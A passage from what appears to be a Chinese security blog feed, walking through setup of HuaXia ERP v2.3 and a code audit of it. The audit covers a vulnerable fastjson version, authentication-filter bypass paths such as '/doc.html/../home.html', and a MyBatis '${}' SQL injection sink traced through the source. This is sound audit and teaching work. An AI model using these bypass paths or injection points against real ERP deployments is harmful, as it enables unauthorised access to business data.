title="8.本章总结"></a>8.本章总结</h2><ul><li>序列结构主要有列表、元组、集合、字典和字符串 </li><li>正向递增索引取值范围[0,N-1]，反向递减索引取值范围[-1,-N] </li><li>切片操作语法结构：序列名 [start ： end : step] </li><li>创建列表的方式：(1)使用[]直接创建 (2)使用内置函数list()创建 </li><li>列表的相关操作方法： <ul><li>添加方法：append()和insert()</li><li>删除方法：clear()、remove()、pop() </li><li>列表元素的排序：sort()和内置函数sorted() </li><li>其它方法：reverse()和copy()</li></ul></li><li>创建元组的方式：（1）使用()直接创建（2）使用内置函数tuple()创建 </li><li>创建字典的方式：（1）使用{}直接创建（2）使用内置函数dict() </li><li>使用内置函数dict()创建字典的两种方式： <ul><li>通过映射函数zip(lst1,Ist2)创建字典 </li><li>通过给定关键字创建字典dict(key1&#x3D;value1,key2&#x3D;value2……)</li></ul></li><li>字典的相关操作方法： <ul><li>查询方法:get()、keys()、values()和items()</li><li>删除方法:pop()、popitem()和clear()</li></ul></li><li>创建集合的方式：（1）使用{}直接创建（2）使用内置函数set()创建 </li><li>集合的相关操作方法： <ul><li>添加方法：add </li><li>删除方法：remove()和clear()</li></ul></li><li>列表、字典、集合都是Python中的可变数据类型，元组是Python中的不可变数据类型 </li><li>列表、元组、字典和集合的遍历都可以通过for循环实现 </li><li>列表、元组、字典和集合的删除都可以使用语句del来实现</li></ul>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>华夏-ERPv2.3搭建&amp;&amp;审计</title>
    <link href="/2025/10/27/%E5%8D%8E%E5%A4%8F-ERPv2.3%E6%90%AD%E5%BB%BA&amp;%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/10/27/%E5%8D%8E%E5%A4%8F-ERPv2.3%E6%90%AD%E5%BB%BA&amp;%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="华夏-ERPv2-3搭建"><a href="#华夏-ERPv2-3搭建" class="headerlink" title="华夏-ERPv2.3搭建"></a>华夏-ERPv2.3搭建</h1><p><strong>JDK</strong>：推荐 <code>JDK 1.8</code> 或 <code>11</code>（jkd1.8&#x3D;&#x3D;jdk8）</p><p><strong>Maven</strong>：3.6+</p><p><strong>Node.js + npm</strong>：前端构建需要，推荐 Node.js <code>14.x/16.x</code></p><p><strong>数据库</strong>：MySQL 5.7 或 8.0（推荐 5.7）</p><p><strong>IDE</strong>：IntelliJ IDEA </p><h2 id="使用IDEA"><a href="#使用IDEA" class="headerlink" title="使用IDEA"></a>使用IDEA</h2><ol><li><p>下载：下载地址（v2.3版本）：<a href="https://github.com/jishenghua/jshERP/releases">https://github.com/jishenghua/jshERP/releases</a> </p></li><li><p>导入到IDEA（记得配置java环境为1.8）（可以自己下载，也可以使用IDEA自带的）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164920568.png" alt="image-20250822213808211"></p></li><li><p>配置数据库（可以先使用phpstudy创建数据库，导入文件<code>jsh_erp.sql</code>，再使用Navicat Premium 17连接数据库）</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164909999.png"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164910003.png" alt="image-20250822213200088"></p><ol start="4"><li><p>使用 IDEA 打开项目，执行 <code>mvn clean install</code>，然后运行 <code>JshErpApplication.java</code> 主类即可启动。</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164938988.png" alt="image-20250822213723216"></p><ul><li><p><strong>Maven</strong> 的命令，用来：</p><ul><li><code>clean</code>：清理掉之前编译的文件</li><li><code>install</code>：编译 + 打包项目，并把 jar&#x2F;war 包安装到本地 Maven 仓库</li></ul><p>先clean ，再install</p></li><li><p>JshErpApplication.java启动</p><ul><li><p>目录结构</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css">jshERP-boot<br> └─ <span class="hljs-attribute">src</span><br>     └─ <span class="hljs-selector-tag">main</span><br>         └─ java<br>             └─ com<br>                 └─ jsh<br>                     └─ erp<br>                         └─ JshErpApplication<span class="hljs-selector-class">.java</span>   ← 启动类<br></code></pre></td></tr></table></figure></li><li><p>路径</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">jshERP-boot<span class="hljs-regexp">/src/m</span>ain<span class="hljs-regexp">/java/</span>com<span class="hljs-regexp">/jsh/</span>erp/JshErpApplication.java<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164910006.png" alt="image-20250822213601489"></p></li></ul></li></ul></li><li><p>出现</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164910011.png" alt="image-20250822213625370"></p><p>说明启动成功（显示url，账号密码就可以自行测试啦）</p></li></ol><h1 id="华夏-ERPv2-3审计"><a href="#华夏-ERPv2-3审计" class="headerlink" title="华夏-ERPv2.3审计"></a>华夏-ERPv2.3审计</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>华夏ERP-2.3 是一款面向中小企业的开源 ERP 系统，基于 <strong>SpringBoot + MyBatis</strong> 构建，前端采用 jQuery、EasyUI 和 AdminLTE。系统功能涵盖多个模块，能够满足中小企业日常经营管理需求。</p><p>该版本特点是 <strong>开源、免费、易部署</strong>，支持多用户权限控制，适合学习、二次开发和中小企业信息化使用。但由于 v2.3 版本依赖库较旧，存在一定的 <strong>安全漏洞</strong>（如 SQL 注入、Fastjson 反序列化、XSS 等），实际部署时需注意升级和安全加固。</p><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>先大致浏览下整个项目的大致结构和配置信息</p><p><strong>pom.xml</strong>：</p><p>该文件用于管理：源代码、配置文件、开发者的信息和角色、问题追踪系统、组织信息、项目授权、项目的url、项目的依赖关系等等。</p><ol><li><p>使用了1.2.55 版本的fastjson，具备fastjson 反序列化的版本要求</p><p>（1.2.55～1.2.68以下存在FastJson <strong>绕过导致反序列化漏洞</strong>）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.55<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>了2.10.0 版本的log4j（emmmmm  但是这个版本是不存在漏洞的）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-to-slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.10.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>数据库使用了MyBatis</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.gitee.starblues<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springboot-plugin-framework-extension-mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2.1-RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><p><strong>filter 配置</strong>：</p><p>里面存放的应该是项目对应的拦截器过滤器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.jsh.erp.filter;<br><br><span class="hljs-keyword">import</span> org.springframework.util.StringUtils;<br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebInitParam;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.regex.Matcher;<br><span class="hljs-keyword">import</span> java.util.regex.Pattern;<br><br><span class="hljs-meta">@WebFilter(filterName = &quot;LogCostFilter&quot;, urlPatterns = &#123;&quot;/*&quot;&#125;,</span><br><span class="hljs-meta">        initParams = &#123;@WebInitParam(name = &quot;ignoredUrl&quot;, value = &quot;.css#.js#.jpg#.png#.gif#.ico&quot;),</span><br><span class="hljs-meta">                      @WebInitParam(name = &quot;filterPath&quot;,</span><br><span class="hljs-meta">                              value = &quot;/user/login#/user/registerUser#/v2/api-docs&quot;)&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogCostFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;filterPath&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">IGNORED_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ignoredUrl&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; ignoredList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    <span class="hljs-keyword">private</span> String[] allowUrls;<br>    <span class="hljs-keyword">private</span> String[] ignoredUrls;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filterPath</span> <span class="hljs-operator">=</span> filterConfig.getInitParameter(FILTER_PATH);<br>        <span class="hljs-keyword">if</span> (!StringUtils.isEmpty(filterPath)) &#123;<br>            allowUrls = filterPath.contains(<span class="hljs-string">&quot;#&quot;</span>) ? filterPath.split(<span class="hljs-string">&quot;#&quot;</span>) : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;filterPath&#125;;<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">ignoredPath</span> <span class="hljs-operator">=</span> filterConfig.getInitParameter(IGNORED_PATH);<br>        <span class="hljs-keyword">if</span> (!StringUtils.isEmpty(ignoredPath)) &#123;<br>            ignoredUrls = ignoredPath.contains(<span class="hljs-string">&quot;#&quot;</span>) ? ignoredPath.split(<span class="hljs-string">&quot;#&quot;</span>) : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;ignoredPath&#125;;<br>            <span class="hljs-keyword">for</span> (String ignoredUrl : ignoredUrls) &#123;<br>                ignoredList.add(ignoredUrl);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response,</span><br><span class="hljs-params">                         FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">servletRequest</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;<br>        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">servletResponse</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">requestUrl</span> <span class="hljs-operator">=</span> servletRequest.getRequestURI();<br>        <span class="hljs-comment">//具体，比如：处理若用户未登录，则跳转到登录页</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">userInfo</span> <span class="hljs-operator">=</span> servletRequest.getSession().getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br>        <span class="hljs-keyword">if</span>(userInfo!=<span class="hljs-literal">null</span>) &#123; <span class="hljs-comment">//如果已登录，不阻止</span><br>            chain.doFilter(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (requestUrl != <span class="hljs-literal">null</span> &amp;&amp; (requestUrl.contains(<span class="hljs-string">&quot;/doc.html&quot;</span>) ||<br>            requestUrl.contains(<span class="hljs-string">&quot;/register.html&quot;</span>) || requestUrl.contains(<span class="hljs-string">&quot;/login.html&quot;</span>))) &#123;<br>            chain.doFilter(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (verify(ignoredList, requestUrl)) &#123;<br>            chain.doFilter(servletRequest, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != allowUrls &amp;&amp; allowUrls.length &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">for</span> (String url : allowUrls) &#123;<br>                <span class="hljs-keyword">if</span> (requestUrl.startsWith(url)) &#123;<br>                    chain.doFilter(request, response);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        servletResponse.sendRedirect(<span class="hljs-string">&quot;/login.html&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">regexPrefix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;^.*&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">regexSuffix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;.*$&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">verify</span><span class="hljs-params">(List&lt;String&gt; ignoredList, String url)</span> &#123;<br>        <span class="hljs-keyword">for</span> (String regex : ignoredList) &#123;<br>            <span class="hljs-type">Pattern</span> <span class="hljs-variable">pattern</span> <span class="hljs-operator">=</span> Pattern.compile(regexPrefix + regex + regexSuffix);<br>            <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> pattern.matcher(url);<br>            <span class="hljs-keyword">if</span> (matcher.matches()) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li><p>我们需要去到<code>doFilter()</code>方法中去看</p><ul><li><p>从session中提取user 参数的值，如果不为null，则跳过认证，这里是没有问题的</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-comment">//具体，比如：处理若用户未登录，则跳转到登录页</span><br><span class="hljs-built_in">Object</span> userInfo = servletRequest.getSession().getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br>        <span class="hljs-keyword">if</span>(userInfo!=<span class="hljs-keyword">null</span>) &#123; <span class="hljs-comment">//如果已登录，不阻止</span><br>            chain.doFilter(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br></code></pre></td></tr></table></figure></li><li><p>如果访问的url 中包含 <code>/doc.html</code>、<code>/register.html</code>、<code>/login.html</code>，这些字符串，则不进行认证</p><p><strong>（如果url 长这样呢：<code>/doc.html/../home.html</code>，怕会出现未授权访问）（不严谨！！！）</strong></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">if</span> (requestUrl != <span class="hljs-literal">null</span> &amp;&amp; (requestUrl.<span class="hljs-built_in">contains</span>(<span class="hljs-string">&quot;/doc.html&quot;</span>) ||<br>    requestUrl.<span class="hljs-built_in">contains</span>(<span class="hljs-string">&quot;/register.html&quot;</span>) || requestUrl.<span class="hljs-built_in">contains</span>(<span class="hljs-string">&quot;/login.html&quot;</span>))) &#123;<br>    chain.doFilter(request, response);  <span class="hljs-comment">// 请求以上URL，均不阻止</span><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>访问<code>.css、.js、.jpg、.png、.gif、.ico、/user/login、/user/registerUser、/v2/api-docs</code>这些内容的时候也不需要认证</p><p><strong>（<code>.css/../home.html</code>，同样存在未授权）（也不严谨！！！）</strong></p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-keyword">if</span> (verify(ignoredList, requestUrl)) &#123;<br>    chain.<span class="hljs-keyword">do</span><span class="hljs-built_in">Filter</span>(servletRequest, <span class="hljs-built_in">response</span>);<br>    return;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != allowUrls &amp;&amp; allowUrls.length &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">for</span> (String url : allowUrls) &#123;<br>        <span class="hljs-keyword">if</span> (requestUrl.startsWith(url)) &#123;<br>            chain.<span class="hljs-keyword">do</span><span class="hljs-built_in">Filter</span>(<span class="hljs-built_in">request</span>, <span class="hljs-built_in">response</span>);<br>            return;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>最后如果用户没有权限，则跳转到登录页</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">servletResponse.sendRedirect(<span class="hljs-string">&quot;/login.html&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li></ul></li></ol><ul><li><p>总结：</p><p>在代码中存在四种判断方式：</p><ul><li>如果已经登录，直接放行</li><li>看URL中是否包含特定路径，包含则放行</li><li>使用<code>verify()</code>方法验证URL，验证通过则放行</li><li>使用以特定字符开头的URL路径则放行</li></ul></li></ul><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><ol><li><p>检查到了Mybatis组件</p><p>所以搜索关键字为：<code>$&#123;</code> ，文件尽量查找跟用户有关的操作，并且查询的是**.xml文件**</p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165024557.png" style="zoom:25%;" /><p>jshERP-2.3\src\main\resources\mapper_xml\UnitMapperEx.xml</p></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectByConditionUnit&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;com.jsh.erp.datasource.entities.UnitExample&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;com.jsh.erp.datasource.mappers.UnitMapper.BaseResultMap&quot;</span>&gt;</span><br>        select *<br>        FROM jsh_unit<br>        where 1=1<br>        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;name != null&quot;</span>&gt;</span><br>            and name like &#x27;%$&#123;name&#125;%&#x27;<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>        and ifnull(delete_flag,&#x27;0&#x27;) !=&#x27;1&#x27;<br>        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;offset != null and rows != null&quot;</span>&gt;</span><br>            limit #&#123;offset&#125;,#&#123;rows&#125;<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="2"><li><p>回溯搜索<code>selectByConditionUnit</code>，只有一个接口和一个用法</p><p>jshERP-2.3\src\main\java\com\jsh\erp\service\unit\UnitService.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;Unit&gt; <span class="hljs-title function_">select</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> offset, <span class="hljs-type">int</span> rows)</span><span class="hljs-keyword">throws</span> Exception &#123;<span class="hljs-comment">//用法</span><br>        List&lt;Unit&gt; list=<span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            list=unitMapperEx.selectByConditionUnit(name, offset, rows);<span class="hljs-comment">//接口</span><br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            JshException.readFail(logger, e);<br>        &#125;<br>        <span class="hljs-keyword">return</span> list;<br>    &#125;<br></code></pre></td></tr></table></figure></li><li><p>寻找参数变量（注意：有些<code>name</code>发生转化，由传递过来的map 控制name 的值）</p><p>先到select</p><p>jshERP-2.3\src\main\java\com\jsh\erp\service\unit\UnitService.java</p><ul><li><p><strong>由传递过来的map 控制name 的值</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> List&lt;?&gt; getUnitList(Map&lt;String, String&gt; map)<span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">search</span> <span class="hljs-operator">=</span> map.get(Constants.SEARCH);  <span class="hljs-comment">// Constants.SEARCH 就是search</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;name&quot;</span>);<span class="hljs-comment">// 通过StringUtil.getInfo 获取name值</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> QueryUtils.order(map);<br>    <span class="hljs-keyword">return</span> unitService.select(name, QueryUtils.offset(map), QueryUtils.rows(map));  <span class="hljs-comment">// QueryUtils.offset(map) 需要我们传入的其他参数有具体的值，且是数字</span><br>&#125;<br></code></pre></td></tr></table></figure><p>此处查看name值获取过程，到<code>getInfo</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">(String search, String key)</span>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(search!=<span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSONObject.parseObject(search);    <span class="hljs-comment">// 解析成json对象（json反序列化）</span><br>        value = obj.getString(key);     <span class="hljs-comment">// 然后从解析的json对象中拿出来name 的属性值</span><br>        <span class="hljs-keyword">if</span>(value.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>            value = <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> value;<br>&#125;<br></code></pre></td></tr></table></figure><p>就是说，我们传入的search 参数内容应该是一个json 内容</p></li><li><p>到<code>getUnitList</code></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript">@Override<br>    public List&lt;?&gt; select(<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">String</span>&gt; <span class="hljs-keyword">map</span>)throws Exception &#123;<br>        <span class="hljs-keyword">return</span> getUnitList(<span class="hljs-keyword">map</span>);<br>    